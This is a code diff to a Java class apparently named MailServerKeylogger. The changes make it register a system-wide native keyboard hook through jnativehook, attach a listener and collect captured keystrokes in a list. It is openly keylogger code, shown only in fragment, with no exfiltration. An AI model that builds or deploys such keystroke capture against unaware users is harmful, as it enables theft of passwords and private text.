@@ -3,10 +3,11 @@ import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
+import java.util.ArrayList;
 import java.util.List;
 
 public class MailServerKeylogger implements NativeKeyListener {
-        static private List<String> keyloggerResult;
+    static private List<String> keyloggerResult = new ArrayList<String>();
     private static MailServerKeylogger instance = new MailServerKeylogger();
 
     public static MailServerKeylogger getInstance() {
@@ -27,8 +28,12 @@ public class MailServerKeylogger implements NativeKeyListener {
         return keyloggerResult;
     }
 
-    public void startKeylogger() {
+    public void startKeylogger() throws NativeHookException {
+        if(!GlobalScreen.isNativeHookRegistered()) {
+            GlobalScreen.registerNativeHook();
+        }
         GlobalScreen.addNativeKeyListener(getInstance());
+        keyloggerResult.clear();
     }
 
     public static void main(String[] args) {
